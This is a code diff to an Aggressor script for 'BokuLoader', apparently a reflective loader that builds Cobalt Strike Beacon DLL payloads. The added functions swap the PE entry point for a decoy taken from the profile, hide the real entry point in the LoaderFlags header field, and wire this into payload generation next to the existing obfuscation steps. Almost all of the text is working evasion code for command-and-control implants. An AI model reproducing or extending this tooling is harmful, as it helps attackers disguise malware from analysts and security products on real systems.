@@ -652,9 +652,66 @@ sub getSectionRawVsVirtualOffset{
 	return $rawVsVirtualDiff;
 }
 
+
+sub setDecoyEntryPoint{
+	local('%pemap $temp_beacon_dll $decoy_EntryPoint');
+	local('@AddressOfEntryPoint_location_A @AddressOfEntryPoint_value_A $AddressOfEntryPoint_location $AddressOfEntryPoint_value');
+	local('@LoaderFlags_location_A @LoaderFlags_value_A $LoaderFlags_location $LoaderFlags_value');
+
+	$temp_beacon_dll  = $1;
+	$decoy_EntryPoint = $2;
+
+	%pemap = pedump($temp_beacon_dll);	
+
+	@AddressOfEntryPoint_location_A  = values(%pemap, @("AddressOfEntryPoint.<location>"));
+	@AddressOfEntryPoint_value_A     = values(%pemap, @("AddressOfEntryPoint.<value>"));
+	$AddressOfEntryPoint_location    = @AddressOfEntryPoint_location_A[0];
+	$AddressOfEntryPoint_value       = @AddressOfEntryPoint_value_A[0];
+	println("[+] Original AddressOfEntryPoint 0x".uc(formatNumber($AddressOfEntryPoint_value, 16)));
+	println("[+] Changing to decoy AddressOfEntryPoint 0x".uc(formatNumber($decoy_EntryPoint, 16)));
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$AddressOfEntryPoint_location,$decoy_EntryPoint);
+
+	@LoaderFlags_location_A  = values(%pemap, @("LoaderFlags.<location>"));
+	@LoaderFlags_value_A     = values(%pemap, @("LoaderFlags.<value>"));
+	$LoaderFlags_location    = @LoaderFlags_location_A[0];
+	$LoaderFlags_value       = @LoaderFlags_value_A[0];
+	println("[+] Original LoaderFlags 0x".uc(formatNumber($LoaderFlags_value, 16)));
+	println("[+] Placing real AddressOfEntryPoint at LoaderFlags location.");
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$LoaderFlags_location,$AddressOfEntryPoint_value);
+
+
+	%pemap = pedump($temp_beacon_dll);	
+	@AddressOfEntryPoint_value_A     = values(%pemap, @("AddressOfEntryPoint.<value>"));
+	$AddressOfEntryPoint_value       = @AddressOfEntryPoint_value_A[0];
+	println("[+] New AddressOfEntryPoint value 0x".uc(formatNumber($AddressOfEntryPoint_value, 16)));
+	
+	@LoaderFlags_value_A     = values(%pemap, @("LoaderFlags.<value>"));
+	$LoaderFlags_value       = @LoaderFlags_value_A[0];
+	println("[+] New LoaderFlags value 0x".uc(formatNumber($LoaderFlags_value, 16)));
+	return $temp_beacon_dll;
+}
+
+
+sub setLoaderFlagZero{
+	local('%pemap $temp_beacon_dll');
+	local('@LoaderFlags_location_A @LoaderFlags_value_A $LoaderFlags_location $LoaderFlags_value');
+
+	$temp_beacon_dll  = $1;
+	%pemap = pedump($temp_beacon_dll);	
+
+	@LoaderFlags_location_A  = values(%pemap, @("LoaderFlags.<location>"));
+	$LoaderFlags_location    = @LoaderFlags_location_A[0];
+	println("[+] Setting OptionalHeader.LoaderFlags to 0x0");
+	$temp_beacon_dll = pe_set_long($temp_beacon_dll,$LoaderFlags_location,0);
+
+	return $temp_beacon_dll;
+}
+
+
 sub generate_my_dll {
 
 	local('$profile $handle $data $loader $temp_dll $userwx $obfuscate $sleep_mask $stomppe $name');
+	local('$prepend $magic_mz $smartinject $image_size_x64 $module_x64 $entry_point $xorKey');
 
 	$name = "BokuLoader";
 
@@ -670,6 +727,7 @@ sub generate_my_dll {
 	$smartinject = [$profile getString: ".stage.smartinject"];
 	$image_size_x64 = [$profile getString: ".stage.image_size_x64"];
 	$module_x64 = [$profile getString: ".stage.module_x64"];
+	$entry_point    = [$profile getString: ".stage.entry_point"];
 
 	#@strings = [$profile getList: ".stage.string"];
 	#println(@strings);
@@ -708,11 +766,18 @@ sub generate_my_dll {
 	println("|__ magic_mz: ".$magic_mz);
 	println("|__ image_size_x64: ".$image_size_x64);
 	println("|__ module_x64: ".$module_x64);
+	println("|__ entry_point: ".$entry_point);
 	println("[+] Beacon DLL size: 0x".uc(formatNumber(strlen($temp_dll), 16)));
 
 	#my_dump_my_pe($temp_dll);
 
 	$temp_dll = nullExportDirectory($temp_dll);
+
+	if ($entry_point ne ""){
+		$temp_dll = setDecoyEntryPoint($temp_dll,$entry_point);
+	}else{
+		$temp_dll = setLoaderFlagZero($temp_dll);
+	}
 
 	$temp_dll = setupAllocatorMethod($temp_dll,$allocator,$module_x64);
 	if ($obfuscate eq "true") {
